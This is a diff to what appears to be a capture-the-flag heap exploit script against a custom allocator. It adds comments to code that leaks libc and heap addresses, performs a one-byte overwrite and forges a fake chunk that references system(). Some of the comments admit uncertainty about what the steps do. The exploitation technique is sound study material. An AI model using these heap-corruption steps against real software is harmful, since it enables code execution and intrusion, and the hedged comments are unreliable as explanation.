@@ -79,7 +79,7 @@ print("libc: ", hex(libc_addr))
 allocate(0, 0x1F, b"A"*0x20)
 allocate(1, 0x1F, b"B"*0x20)
 deallocate(0)
-allocate(0, 0x20, b"C"*0x21)
+allocate(0, 0x20, b"C"*0x21) # we have a one byte overwrite into entry at index 1 now, overwriting \0 byte that was preventing us from reading heap address there
 
 
 heap_leak = int((show(0)[0x21:-1][::-1]+b"\0").hex(), 16)
@@ -102,20 +102,27 @@ libc_got = libc_addr + 0x1d2080
 flags = 0x2c00000000000000
 next_ = libc_got+0x200#-(heap_leak+0x10b0)
 arena = libtinyalloc_leak+0x2e7f#libc_addr+0x1ec040
+
+# create fake chunk within true chunk
 #             next and flags |     fd     |     bk
 payload = p64(flags | next_) + p64(arena) + p64(arena)+p64(libc.symbols['system']) #unnecessary system leftover
+
+
 
 allocate(4, 0x20, b"E"*0x21)
 allocate(3, 0x200, p64(0)+payload+b"\n")
 
 deallocate(2)
 
+# use one byte overwrite to make a next pointer point onto the fake chunk instead (not fully sure)
 allocate(2, 0x1008, b"A"*0x1008+b"\xb0")
 
 allocate(5, 0x10, b"."*0xF+b"\n")
 
 deallocate(4)
 deallocate(3)
+
+# no idea what this ^ does exactly
 
 
 #input("magic1")
